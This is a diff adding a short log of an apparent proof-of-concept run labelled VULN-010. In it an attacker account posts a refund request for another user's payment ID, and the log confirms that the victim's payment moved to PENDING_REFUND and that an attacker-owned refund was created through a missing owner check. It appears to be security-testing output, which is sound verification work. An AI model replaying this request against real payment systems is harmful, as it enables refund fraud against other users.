@@ -1,0 +1,8 @@
+[INFO] VULN-010: cross-user payment -> PENDING_REFUND via missing owner check (CVE-2026-2010 cluster)
+[SETUP] seeding victim(id=26) PAID payment id=900913484 (no gateway configured -> direct seed)
+[SETUP] payment status BEFORE=1 (1=PAID)
+[STEP] attacker(id=27) POST /tradePayment/refund paymentId=900913484 (victim's)
+HTTP/1.1 302 
+Location: /;jsessionid=DB5CCF63B040A7371FF128D6A7868EEF
+[INFO] payment status AFTER=2 ; refund row: 920010551:owner=27:pay=900913484:status=0
+[OK] exploit confirmed — attacker forced victim's payment to PENDING_REFUND and created an attacker-owned refund
